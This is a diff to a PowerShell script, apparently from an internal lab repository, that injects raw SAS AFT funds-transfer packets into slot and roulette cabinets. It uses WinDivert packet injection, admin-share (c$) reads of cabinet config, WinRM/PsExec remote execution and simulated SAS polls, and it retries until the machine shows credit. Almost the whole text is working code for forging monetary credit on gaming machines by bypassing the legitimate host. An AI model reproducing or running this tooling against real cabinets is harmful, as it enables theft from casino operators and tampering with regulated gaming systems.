+        ('\\{0}\c$\Goldclub\var\log\ruleta' -f $Computer)
+    )) {
+        if (Test-Path -LiteralPath $p) { return $true }
+    }
+    return $false
+}
+
+function Resolve-CabinetProfile {
+    param(
+        [string] $Computer,
+        [ValidateSet('Auto', 'Slot', 'Roulette')]
+        [string] $Requested = 'Auto'
+    )
+    if ($Requested -ne 'Auto') { return $Requested }
+    if (Test-CabinetIsRoulette -Computer $Computer) { return 'Roulette' }
+    return 'Slot'
+}
+
+function Get-ClientsSetSasChannel {
+    <#
+    Read Aurum SASControler1\ClientsSet.xml for the live SAS address + bridge ports.
+    Roulette lab (.90): SASAddress=1, Port=30500, WakeUpPort=30550.
+    #>
+    param([string] $Computer)
+    $result = [ordered]@{
+        Path          = $null
+        SasAddress    = 0
+        Port          = 0
+        WakeUpPort    = 0
+        AurumEgmId    = $null
+        Ok            = $false
+        Detail        = ''
+    }
+    $candidates = @(
+        ('\\{0}\c$\goldclub\services\aurum\config\SASControler1\ClientsSet.xml' -f $Computer),
+        ('\\{0}\c$\Goldclub\services\aurum\config\SASControler1\ClientsSet.xml' -f $Computer)
+    )
+    $path = $candidates | Where-Object { Test-Path -LiteralPath $_ } | Select-Object -First 1
+    if (-not $path) {
+        $result.Detail = 'ClientsSet.xml not found'
+        return [pscustomobject]$result
+    }
+    $result.Path = $path
+    try {
+        [xml]$xml = Get-Content -LiteralPath $path -Raw
+        $client = $xml.ClientsSet.Clients.SASClientState
+        if (-not $client) { throw 'No SASClientState node' }
+        $addr = 0
+        [void][int]::TryParse([string]$client.SASAddress, [ref]$addr)
+        $port = 0
+        [void][int]::TryParse([string]$client.Port, [ref]$port)
+        $wake = 0
+        [void][int]::TryParse([string]$client.WakeUpPort, [ref]$wake)
+        $result.SasAddress = $addr
+        $result.Port = $port
+        $result.WakeUpPort = $wake
+        $result.AurumEgmId = [string]$client.AurumEgmId
+        $result.Ok = ($addr -ge 1 -and $addr -le 127)
+        $result.Detail = "SASAddress=$addr Port=$port WakeUpPort=$wake EgmId=$($result.AurumEgmId)"
+    }
+    catch {
+        $result.Detail = "ClientsSet parse failed: $($_.Exception.Message)"
+    }
+    return [pscustomobject]$result
+}
+
+function Resolve-LiveSasBridgePort {
+    <#
+    Probe ESTABLISHED CommCtrlSAS<->Aurum TCP ports. Slot uses 31150; roulette MUX path uses 30550.
+    #>
+    param(
+        [string] $Computer,
+        [int[]]  $PreferredPorts,
+        [pscredential] $Credential
+    )
+    $ports = @($PreferredPorts | Where-Object { $_ -gt 0 } | Select-Object -Unique)
+    if ($ports.Count -eq 0) { $ports = @(31150, 30550) }
+
+    $result = [ordered]@{
+        Port          = 0
+        Established   = @()
+        Listening     = @()
+        Port40000Only = $false
+        Detail        = ''
+    }
+
+    $probeScript = {
+        param([int[]] $Want)
+        $est = @()
+        $listen = @()
+        foreach ($p in $Want) {
+            $e = @(Get-NetTCPConnection -LocalPort $p -State Established -ErrorAction SilentlyContinue)
+            if ($e.Count -gt 0) { $est += $p }
+            $l = @(Get-NetTCPConnection -LocalPort $p -State Listen -ErrorAction SilentlyContinue)
+            if ($l.Count -gt 0) { $listen += $p }
+        }
+        $only400 = $false
+        $l400 = @(Get-NetTCPConnection -LocalPort 40000 -State Listen -ErrorAction SilentlyContinue)
+        if ($l400.Count -gt 0 -and $est.Count -eq 0 -and $listen.Count -eq 0) { $only400 = $true }
+        [pscustomobject]@{ Established = $est; Listening = $listen; Port40000Only = $only400 }
+    }
+
+    $remote = $null
+    if ($Credential -and (Test-LabWinRmReachable -Computer $Computer)) {
+        try {
+            if (Get-Command Add-LabTrustedHostIfNeeded -ErrorAction SilentlyContinue) {
+                $null = Add-LabTrustedHostIfNeeded -Computer $Computer
+            }
+            $opt = New-PSSessionOption -OperationTimeout 60000 -OpenTimeout 15000
+            $remote = Invoke-Command -ComputerName $Computer -Credential $Credential `
+                -Authentication Negotiate -SessionOption $opt `
+                -ScriptBlock $probeScript -ArgumentList @(,$ports)
+        }
+        catch {
+            $result.Detail = "WinRM bridge probe failed: $($_.Exception.Message)"
+        }
+    }
+
+    if (-not $remote) {
+        # Fallback: CommCtrl log hints only (no live TCP).
+        $bridge = Get-CommCtrlSasBridgeDetail -Computer $Computer
+        $result.Port40000Only = [bool]$bridge.Port40000Only
+        if ($bridge.Bridge30550 -and ($ports -contains 30550)) {
+            $result.Port = 30550
+            $result.Detail = 'log hint: 30550 (no live TCP probe)'
+            return [pscustomobject]$result
+        }
+        if ($bridge.Bridge31150 -and ($ports -contains 31150)) {
+            $result.Port = 31150
+            $result.Detail = 'log hint: 31150 (no live TCP probe)'
+            return [pscustomobject]$result
+        }
+        $result.Detail = if ($result.Detail) { $result.Detail } else { 'no WinRM probe and no bridge port in CommCtrl log' }
+        return [pscustomobject]$result
+    }
+
+    $result.Established = @($remote.Established)
+    $result.Listening = @($remote.Listening)
+    $result.Port40000Only = [bool]$remote.Port40000Only
+    foreach ($p in $ports) {
+        if ($result.Established -contains $p) {
+            $result.Port = $p
+            $result.Detail = "ESTABLISHED on $p"
+            return [pscustomobject]$result
+        }
+    }
+    foreach ($p in $ports) {
+        if ($result.Listening -contains $p) {
+            $result.Port = $p
+            $result.Detail = "LISTEN only on $p (Aurum not connected yet)"
+            return [pscustomobject]$result
+        }
+    }
+    if ($result.Port40000Only) {
+        $result.Detail = 'Gateway SAS stuck at :40000 (MUX/COM bridge not up - roulette needs COM5 @921600 for :30550)'
+    }
+    else {
+        $result.Detail = "no ESTABLISHED/LISTEN among $($ports -join ',')"
+    }
+    return [pscustomobject]$result
 }
 
 function Write-MuxComPollPrerequisites {
@@ -1236,8 +1621,8 @@ function Format-SasComProbeFailure {
 function Resolve-SasPollKeeperScript {
     # Prefer repo sas_poll_keeper.py (blocker detection + shared wire helpers) over standalone.
     $candidates = @(
-        (Join-Path $PSScriptRoot 'scripts\sas_poll_keeper.py'),
-        (Join-Path $PSScriptRoot 'scripts\sas_poll_keeper_standalone.py')
+        (Join-Path (Split-Path $PSScriptRoot -Parent) 'scripts\sas_poll_keeper.py'),
+        (Join-Path (Split-Path $PSScriptRoot -Parent) 'scripts\sas_poll_keeper_standalone.py')
     )
     $repoRoot = Split-Path $PSScriptRoot -Parent
     if ($repoRoot) {
@@ -1256,7 +1641,7 @@ function Test-SasComPortAvailable {
     param([string] $Port = 'COM4')
     $keeper = Resolve-SasPollKeeperScript
     if (-not $keeper) {
-        return @{ Ok = $false; Message = "Missing SAS poll keeper script under $PSScriptRoot\scripts (expected sas_poll_keeper_standalone.py)" }
+        return @{ Ok = $false; Message = "Missing SAS poll keeper script under $(Split-Path $PSScriptRoot -Parent)\scripts (expected sas_poll_keeper_standalone.py)" }
     }
     $py = Get-Command python -ErrorAction SilentlyContinue
     if (-not $py) {
@@ -1275,7 +1660,7 @@ function Start-SasPollKeeper {
     )
     $keeper = Resolve-SasPollKeeperScript
     if (-not $keeper) {
-        throw "Missing SAS poll keeper script under $PSScriptRoot\scripts"
+        throw "Missing SAS poll keeper script under $(Split-Path $PSScriptRoot -Parent)\scripts"
     }
     $py = Get-Command python -ErrorAction SilentlyContinue
     if (-not $py) {
@@ -1288,8 +1673,9 @@ function Start-SasPollKeeper {
         '--interval-ms', '200',
         '--warmup-s', ([string]([math]::Max(0.5, $WarmupSec)))
     )
+    $repoRoot = Split-Path $PSScriptRoot -Parent
     $proc = Start-Process -FilePath $py.Source -ArgumentList $args `
-        -WorkingDirectory $PSScriptRoot -WindowStyle Hidden -PassThru
+        -WorkingDirectory $repoRoot -WindowStyle Hidden -PassThru
     Start-Sleep -Milliseconds ([math]::Min(1500, $warmupMs))
     return $proc
 }
@@ -1414,7 +1800,22 @@ function Resolve-SasPollStrategy {
             UseComKeeper = $false
         }
     }
-    if (Test-CabinetSasPollsRecent -Computer $Computer -WithinSeconds 12) {
+    $pollsActive = Test-CabinetSasPollsRecent -Computer $Computer -WithinSeconds 12
+    # Proven path (txn 83/84): always use pollaft for WinDivert so post-AFT 80/81 continue.
+    # Organic/live polls alone + WdInject often yields ingest-without-credit.
+    if ($Mode -eq 'WinDivert') {
+        return @{
+            PollsActive  = $pollsActive
+            UsePollAft   = $true
+            UseComKeeper = $false
+            Message      = if ($pollsActive) {
+                'Organic/tester polls active - pollaft still used for post-AFT 80/81 (tester on OK)'
+            } else {
+                'WinDivert pollaft (simulate 80/81 + AFT; tester off OK)'
+            }
+        }
+    }
+    if ($pollsActive) {
         return @{
             PollsActive  = $true
             UsePollAft   = $false
@@ -1425,9 +1826,6 @@ function Resolve-SasPollStrategy {
     switch ($Mode) {
         'Com' {
             return @{ PollsActive = $false; UsePollAft = $false; UseComKeeper = $true }
-        }
-        'WinDivert' {
-            return @{ PollsActive = $false; UsePollAft = $true; UseComKeeper = $false }
         }
         default {
             return @{ PollsActive = $false; UsePollAft = $true; UseComKeeper = $true }
@@ -1500,16 +1898,6 @@ function Invoke-CabinetInjectRemediationLoop {
     $pollsReady = $false
     $usePollAft = $false
 
-    if ($PollStrategy.PollsActive -or (Test-CabinetSasPollsRecent -Computer $Computer -SinceUtc $PollCutoffUtc -WithinSeconds 12)) {
-        return [pscustomobject]@{
-            PollsReady     = $true
-            PollKeeperProc = $null
-            UsePollAft     = $false
-            CycleLog       = $cycleLog
-            LastDiagnosis  = $null
-        }
-    }
-
     if ($SasPollModeEffective -eq 'None') {
         return [pscustomobject]@{
             PollsReady     = $false
@@ -1520,7 +1908,8 @@ function Invoke-CabinetInjectRemediationLoop {
         }
     }
 
-    # Explicit WinDivert pollaft: skip host COM4/MUX prerequisite (simulated polls on loopback 31150).
+    # Explicit WinDivert pollaft (proven): even when organic 80/81 already flow, keep pollaft
+    # so post-AFT polls continue after 0x72 (WdInject-only often stops polls -> no credit).
     if ($SasPollModeEffective -eq 'WinDivert' -and $PollStrategy.UsePollAft) {
         $usePollAft = $true
         $cycleLog.Add([pscustomobject]@{ Cycle = 0; Summary = 'WinDivert pollaft (no COM keeper)'; Steps = @('poll path: WdPollInject.exe pollaft on inject') }) | Out-Null
@@ -1528,6 +1917,16 @@ function Invoke-CabinetInjectRemediationLoop {
             PollsReady     = $true
             PollKeeperProc = $null
             UsePollAft     = $true
+            CycleLog       = $cycleLog
+            LastDiagnosis  = $null
+        }
+    }
+
+    if ($PollStrategy.PollsActive -or (Test-CabinetSasPollsRecent -Computer $Computer -SinceUtc $PollCutoffUtc -WithinSeconds 12)) {
+        return [pscustomobject]@{
+            PollsReady     = $true
+            PollKeeperProc = $null
+            UsePollAft     = $false
             CycleLog       = $cycleLog
             LastDiagnosis  = $null
         }
@@ -1839,8 +2238,68 @@ switch ($TransferType) {
     'non-restricted' { $nonRestrictedAmt = $AmountCents }
 }
 
-# ---- build the payload ----
+# ---- resolve cabinet profile + ClientsSet channel (addr / WakeUpPort) BEFORE building 0x72 ----
+$resolvedProfile = Resolve-CabinetProfile -Computer $ComputerName -Requested $CabinetProfile
+$clientsSet = Get-ClientsSetSasChannel -Computer $ComputerName
+if ($clientsSet.Ok) {
+    Write-Host "[*] ClientsSet: $($clientsSet.Detail)" -ForegroundColor DarkGray
+    if (-not $PSBoundParameters.ContainsKey('SasAddress')) {
+        $SasAddress = [byte]$clientsSet.SasAddress
+        Write-Host "[+] SasAddress=$SasAddress (from ClientsSet.xml)" -ForegroundColor Green
+    }
+    elseif ([int]$SasAddress -ne [int]$clientsSet.SasAddress) {
+        Write-Host "[!] SasAddress=$SasAddress differs from ClientsSet SASAddress=$($clientsSet.SasAddress) - inject may TX-only on wrong channel." -ForegroundColor Yellow
+    }
+}
+else {
+    Write-Host "[*] ClientsSet: $($clientsSet.Detail) - using SasAddress=$SasAddress" -ForegroundColor DarkGray
+}
 
+$wantAutoBridge = $AutoBridgePort -or ($BridgePort -le 0) -or ($resolvedProfile -eq 'Roulette' -and -not $PSBoundParameters.ContainsKey('BridgePort'))
+if ($wantAutoBridge) {
+    $pref = [System.Collections.Generic.List[int]]::new()
+    if ($clientsSet.WakeUpPort -gt 0) { $pref.Add([int]$clientsSet.WakeUpPort) }
+    if ($clientsSet.Port -gt 0 -and -not $pref.Contains([int]$clientsSet.Port)) { $pref.Add([int]$clientsSet.Port) }
+    if ($resolvedProfile -eq 'Roulette') {
+        foreach ($p in @(30550, 31150, 30500)) {
+            if (-not $pref.Contains($p)) { $pref.Add($p) }
+        }
+    }
+    else {
+        foreach ($p in @(31150, 30550)) {
+            if (-not $pref.Contains($p)) { $pref.Add($p) }
+        }
+    }
+    Write-Host "[*] CabinetProfile=$resolvedProfile - probing live SAS bridge among $($pref -join ', ') ..." -ForegroundColor Cyan
+    $bridgeProbe = Resolve-LiveSasBridgePort -Computer $ComputerName -PreferredPorts @($pref.ToArray()) -Credential $Credential
+    if ($bridgeProbe.Port -gt 0) {
+        $BridgePort = [int]$bridgeProbe.Port
+        Write-Host "[+] Using BridgePort=$BridgePort ($($bridgeProbe.Detail))" -ForegroundColor Green
+        if ($clientsSet.WakeUpPort -gt 0 -and $BridgePort -ne $clientsSet.WakeUpPort -and $BridgePort -ne $clientsSet.Port) {
+            Write-Host "[!] BridgePort $BridgePort is not ClientsSet WakeUpPort=$($clientsSet.WakeUpPort)/Port=$($clientsSet.Port) - wrong channel risk." -ForegroundColor Yellow
+        }
+        if ($bridgeProbe.Detail -match 'LISTEN only') {
+            Write-Host '    Warning: Aurum not ESTABLISHED yet - pollaft will wait for ephemeral client.' -ForegroundColor Yellow
+        }
+    }
+    else {
+        Write-Host "[!] SAS bridge not ready: $($bridgeProbe.Detail)" -ForegroundColor Red
+        if ($bridgeProbe.Port40000Only) {
+            Write-Host '    Roulette: Gateway SAS is on :40000 only. Restore COM5/MUX (cold boot), then retry.' -ForegroundColor Yellow
+        }
+        if ($Send) {
+            throw "No live CommCtrlSAS<->Aurum bridge on $($pref -join '/'). $($bridgeProbe.Detail)"
+        }
+        $BridgePort = if ($clientsSet.WakeUpPort -gt 0) { [int]$clientsSet.WakeUpPort } `
+            elseif ($resolvedProfile -eq 'Roulette') { 30550 } else { 31150 }
+        Write-Host "[*] DryRun fallback BridgePort=$BridgePort (not verified live)" -ForegroundColor DarkGray
+    }
+}
+elseif ($resolvedProfile -eq 'Roulette' -and $BridgePort -eq 31150) {
+    Write-Host '[*] Roulette profile with BridgePort 31150 - if inject fails with NO_ESTABLISHED, retry with -AutoBridgePort (expects ClientsSet WakeUpPort, usually 30550).' -ForegroundColor Yellow
+}
+
+# ---- build the payload (after channel resolve so addr/port match ClientsSet) ----
 $sasPacket = New-AftTransferPacket -Address $SasAddress -CashableAmount $cashableAmt -RestrictedAmount $restrictedAmt -NonRestrictedAmount $nonRestrictedAmt -Asset $AssetNumber -TxnNumber $TransactionNumber
 $bridgePayload = New-Object byte[] ($sasPacket.Length + 1)
 $bridgePayload[0] = 0x1B
@@ -1861,8 +2320,8 @@ $markerHex = ConvertTo-Hex ([byte[]]$markerBytes.ToArray())
 
 Write-Host ''
 Write-Host '=== WinDivert raw SAS AFT injection ===' -ForegroundColor White
-Write-Host "Cabinet : $ComputerName  |  Flow: CommCtrlSAS:$BridgePort -> Aurum:<ephemeral> (server->client)"
-Write-Host "Asset   : $AssetNumber   |  Transfer type: $TransferType   |  Amount: $AmountCents (raw SAS units; = `$$([double]$AmountCents / 100.0) if 1 unit = 1 cent)  |  Txn: Test Transaction$TransactionNumber"
+Write-Host "Cabinet : $ComputerName  |  Profile: $resolvedProfile  |  Flow: CommCtrlSAS:$BridgePort -> Aurum:<ephemeral> (server->client)"
+Write-Host "SAS addr: $SasAddress   |  Asset: $AssetNumber   |  Transfer type: $TransferType   |  Amount: $AmountCents (raw SAS units; = `$$([double]$AmountCents / 100.0) if 1 unit = 1 cent)  |  Txn: Test Transaction$TransactionNumber"
 Write-Host ''
 Write-Host "SAS packet     : $sasPacketHex"
 Write-Host "Bridge payload : $bridgePayloadHex   (0x1B + SAS bytes; this is injected)"
@@ -1878,8 +2337,9 @@ Write-Host ''
 $WinDivertDir = Resolve-WinDivertDir -Preferred $WinDivertDir
 $dll = Join-Path $WinDivertDir 'WinDivert.dll'
 $sys = Join-Path $WinDivertDir 'WinDivert64.sys'
-$csSrc = Join-Path $PSScriptRoot 'WdInject.cs'
-$pollCsSrc = Join-Path $PSScriptRoot 'WdPollInject.cs'
+$RepoRoot = Split-Path -Parent $PSScriptRoot
+$csSrc = Join-Path $RepoRoot 'probes\WdInject.cs'
+$pollCsSrc = Join-Path $RepoRoot 'probes\WdPollInject.cs'
 foreach ($f in @($PsExecPath, $dll, $sys, $csSrc, $pollCsSrc)) {
     if (-not (Test-Path -LiteralPath $f)) { throw "Required file not found: $f" }
 }
@@ -1945,7 +2405,7 @@ if ($bootstrap.Attempted -and -not $bootstrap.SmbOk) {
 $pollKeeperProc = $null
 $sasPollModeEffective = if ($NoAutoSasPoll) { 'None' } else { $SasPollMode }
 if ((Test-CabinetPrefersMuxComPolls -Computer $ComputerName) -and ($sasPollModeEffective -eq 'Auto')) {
-    # legacy hook — COM-first path disabled; WinDivert pollaft matches .90
+    # legacy hook - COM-first path disabled; WinDivert pollaft matches .90
 }
 $pollStrategy = Resolve-SasPollStrategy -Computer $ComputerName -Mode $sasPollModeEffective
 Write-MuxComPollPrerequisites -Computer $ComputerName -Port $SasComPort
@@ -1975,8 +2435,25 @@ $autoWakeAction = {
     $wakeSinceUtcRef.Value = (Get-Date).ToUniversalTime()
 }
 
+$organicPolls = Test-CabinetSasPollsRecent -Computer $ComputerName -WithinSeconds 12
+if ($organicPolls) {
+    Write-Host '[*] Organic SAS polls active (IGT tester or host) - inject works with tester on or off; AutoWake suppressed unless hard pending AFT.' -ForegroundColor Cyan
+}
+
 $aurumState = Get-AurumAftFsmState -Computer $ComputerName
-if (-not $SkipAurumReadyWait -and -not $aurumState.Ready -and $autoWakeEnabled -and -not $autoWakeDone) {
+if ($aurumState.SoftOnly) {
+    Write-Host "[*] $($aurumState.Reason)" -ForegroundColor DarkGray
+    if ($aurumState.LastLine) {
+        Write-Host "    $($aurumState.LastLine)" -ForegroundColor DarkGray
+    }
+}
+
+# Do not recycle the bridge for soft/cashout noise, and never AutoWake while a live
+# tester is polling unless the hard pending-AFT blockers need a clear.
+$allowAutoWakeNow = $autoWakeEnabled -and -not $autoWakeDone -and -not $aurumState.SoftOnly `
+    -and (-not $organicPolls -or (Test-AurumWakeableBlocker -State $aurumState))
+
+if (-not $SkipAurumReadyWait -and -not $aurumState.Ready -and $allowAutoWakeNow) {
     Write-Host "[*] Aurum not ready: $($aurumState.Reason)" -ForegroundColor Yellow
     if (Test-AurumWakeableBlocker -State $aurumState) {
         Write-Host '[*] AutoWake: restart bridge + clear stale pending AFT (exception 69)...' -ForegroundColor Cyan
@@ -1987,14 +2464,19 @@ if (-not $SkipAurumReadyWait -and -not $aurumState.Ready -and $autoWakeEnabled -
     & $autoWakeAction $aurumState
     $autoWakeDone = $autoWakeDoneRef.Value
     $wakeSinceUtc = $wakeSinceUtcRef.Value
-    $aurumState = @{ Ready = $false; Reason = 'Post-wake'; LastLine = $null }
+    $aurumState = @{ Ready = $false; Reason = 'Post-wake'; LastLine = $null; SoftOnly = $false }
 }
 
 if (-not $SkipAurumReadyWait -and -not $aurumState.Ready) {
     $waitSec = if ($autoWakeDone) { [math]::Min($AurumReadyWaitSec, 60) } else { $AurumReadyWaitSec }
+    # With organic tester polls, keep the wait short — usually idle already.
+    if ($organicPolls -and -not $autoWakeDone) {
+        $waitSec = [math]::Min($waitSec, 30)
+    }
     Write-Host "[*] Waiting up to ${waitSec}s for Aurum WAT idle..." -ForegroundColor Cyan
+    $wakeOnBlocker = $allowAutoWakeNow -or ($autoWakeEnabled -and -not $organicPolls)
     $aurumState = Wait-AurumAftReady -Computer $ComputerName -TimeoutSec $waitSec -SinceUtc $wakeSinceUtc `
-        -AutoWakeOnBlocker:$autoWakeEnabled -AutoWakeDoneRef $autoWakeDoneRef -WakeSinceUtcRef $wakeSinceUtcRef `
+        -AutoWakeOnBlocker:$wakeOnBlocker -AutoWakeDoneRef $autoWakeDoneRef -WakeSinceUtcRef $wakeSinceUtcRef `
         -AutoWakeAction $autoWakeAction
     $autoWakeDone = $autoWakeDoneRef.Value
     $wakeSinceUtc = $wakeSinceUtcRef.Value
@@ -2010,7 +2492,7 @@ if (-not $aurumState.Ready) {
     if ($aurumState.LastLine) {
         Write-Host "    $($aurumState.LastLine)" -ForegroundColor DarkGray
     }
-    Write-Host '    Wait for ALL WAT TRANSACTIONS FINISHED (or clear exception 69), then retry. Use -SkipAurumReadyWait to override.' -ForegroundColor Yellow
+    Write-Host '    Wait for transfer finish / clear exception 69 (cashout exception 66 is ignored). Use -SkipAurumReadyWait to override.' -ForegroundColor Yellow
     exit 5
 }
 Write-Host "[+] Aurum AFT ready: $($aurumState.Reason)" -ForegroundColor Green
@@ -2022,16 +2504,32 @@ $preflightBridge = Get-Wat2AftWarmupFailureDetail -Computer $ComputerName -TailL
 $bridgeNeedsRecycle = ($preflightBridge.Category -in @('mapping_false', 'wat2aft_stale', 'egm_connect_retry', 'no_owned_device')) `
     -or (-not (Test-AurumWat2AftRecent -Computer $ComputerName -WithinSeconds 300))
 if ($bridgeNeedsRecycle -and $autoWakeEnabled -and -not $autoWakeDone -and -not $SkipAurumReadyWait) {
-    Write-Host ("[*] Bridge recycle needed ({0}) - AutoWake (proven wake-before-inject path)..." -f $preflightBridge.Category) -ForegroundColor Cyan
-    if ($preflightBridge.Evidence.Count -gt 0) {
-        Write-Host "    $($preflightBridge.Evidence[0])" -ForegroundColor DarkGray
+    if ($organicPolls) {
+        Write-Host ("[*] Bridge recycle hinted ({0}) but organic/tester polls are live - skipping AutoWake to keep the SAS channel up." -f $preflightBridge.Category) -ForegroundColor Yellow
     }
-    & $autoWakeAction $null
-    $autoWakeDone = $autoWakeDoneRef.Value
-    $wakeSinceUtc = $wakeSinceUtcRef.Value
+    else {
+        Write-Host ("[*] Bridge recycle needed ({0}) - AutoWake (proven wake-before-inject path)..." -f $preflightBridge.Category) -ForegroundColor Cyan
+        if ($preflightBridge.Evidence.Count -gt 0) {
+            Write-Host "    $($preflightBridge.Evidence[0])" -ForegroundColor DarkGray
+        }
+        & $autoWakeAction $null
+        $autoWakeDone = $autoWakeDoneRef.Value
+        $wakeSinceUtc = $wakeSinceUtcRef.Value
+    }
 }
 
-if ($autoWakeDone) {
+$deferWat2AftForPollSim = -not $pollStrategy.PollsActive -and ($pollStrategy.UsePollAft -or $pollStrategy.UseComKeeper)
+
+if ($autoWakeDone -and $deferWat2AftForPollSim) {
+    Write-Host '[*] Post-wake: skipping WAT2AFT wait  -  no 80/81 yet; pollaft/COM keeper will bring polls then AFT in one session.' -ForegroundColor Cyan
+    if ($pollStrategy.UsePollAft) {
+        Write-Host ("    WinDivert pollaft will simulate 1B80/1B81 on loopback {0} first." -f $BridgePort) -ForegroundColor DarkGray
+    }
+    if ($pollStrategy.UseComKeeper) {
+        Write-Host "[*] Built-in COM poll keeper will drive 80/81 on $SasComPort first." -ForegroundColor DarkGray
+    }
+}
+elseif ($autoWakeDone) {
     Write-Host '[*] Post-wake: confirming WAT2AFT UP + Aurum mapping before inject...' -ForegroundColor Cyan
     Confirm-AurumInjectReady -Computer $ComputerName -WatTimeoutSec 90 -MappingTimeoutSec 45 `
         -SettleSec $AurumPostWakeSettleSec -SinceUtc $wakeSinceUtc -Context 'post-AutoWake' `
@@ -2048,11 +2546,11 @@ elseif ((Test-AurumWat2AftRecent -Computer $ComputerName -WithinSeconds 120)) {
     $wakeSinceUtc = $wakeSinceUtcRef.Value
 }
 elseif ($AurumWarmupSec -gt 0) {
-    $deferWat2AftForPollSim = -not $pollStrategy.PollsActive -and ($pollStrategy.UsePollAft -or $pollStrategy.UseComKeeper)
     if ($deferWat2AftForPollSim) {
         if ($pollStrategy.UsePollAft) {
-            Write-Host '[*] Skipping pre-inject WAT2AFT warmup  -  WinDivert pollaft will simulate 1B80/1B81 on loopback 31150 first.' -ForegroundColor Cyan
+            Write-Host ("[*] Skipping pre-inject WAT2AFT warmup  -  WinDivert pollaft will simulate 1B80/1B81 on loopback {0} first." -f $BridgePort) -ForegroundColor Cyan
             Write-Host '    Polls must appear in sasmsgr before WAT2AFT can own the device; pollaft runs general polls then AFT in one session.' -ForegroundColor DarkGray
+            Write-Host '    Works with IGT tester on (organic polls) or off (pollaft supplies 80/81).' -ForegroundColor DarkGray
         }
         if ($pollStrategy.UseComKeeper) {
             Write-Host '[*] Skipping pre-inject WAT2AFT warmup  -  built-in COM poll keeper will drive 80/81 on the MUX cable first.' -ForegroundColor Cyan
@@ -2091,8 +2589,8 @@ $remediation = Invoke-CabinetInjectRemediationLoop -Computer $ComputerName -Cred
 $pollKeeperProc = $remediation.PollKeeperProc
 if ($remediation.UsePollAft) {
     $usePollAft = $true
-    Write-Host '[*] WinDivert poll sim: 1B80/1B81 injected into CommCtrlSAS:31150 -> Aurum TCP (no physical COM host).' -ForegroundColor Cyan
-    Write-Host "    Waiting up to ${WinDivertEphemWaitSec}s for Aurum TCP client on 31150, then poll cadence ${WinDivertPollIntervalMs}ms, AFT @ ${WinDivertPollInjectDelayMs}ms, window ${WinDivertPollSeconds}s" -ForegroundColor DarkGray
+    Write-Host ("[*] WinDivert poll sim: 1B80/1B81 injected into CommCtrlSAS:{0} -> Aurum TCP (no physical COM host)." -f $BridgePort) -ForegroundColor Cyan
+    Write-Host ("    Waiting up to {0}s for Aurum TCP client on {1}, then poll cadence {2}ms, AFT @ {3}ms, window {4}s" -f $WinDivertEphemWaitSec, $BridgePort, $WinDivertPollIntervalMs, $WinDivertPollInjectDelayMs, $WinDivertPollSeconds) -ForegroundColor DarkGray
 }
 elseif ($remediation.PollsReady) {
     Write-Host '[+] Live 80/81 polls visible in cabinet sasmsgr  -  safe to inject.' -ForegroundColor Green
@@ -2199,7 +2697,7 @@ $pollAftScript = New-WinDivertPollAftRemoteScript -RemoteRunPath $remotePollRunP
 $encPollAft = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($pollAftScript))
 
 # ---- transport selection (WinRM preferred / PsExec fallback) ----
-$transportStatePath = Join-Path $PSScriptRoot '.aft-windivert-transport.json'
+$transportStatePath = Join-Path (Split-Path $PSScriptRoot -Parent) '.aft-windivert-transport.json'
 
 function Get-TransportState {
     param([string] $Path)
@@ -2469,6 +2967,10 @@ while ($attempt -lt $MaxRetries) {
             continue
         }
         if ((@($creditEvidence).Count -gt 0)) {
+            break
+        }
+        if ($NoAutoWake) {
+            Write-Host '[!] sasmsgr ingested but no credit evidence  -  -NoAutoWake set; not thrashing bridge. Stopping retries.' -ForegroundColor Yellow
             break
         }
         Write-Host '[!] sasmsgr ingested but no credit evidence  -  retrying with AutoWake + next txn...' -ForegroundColor Yellow
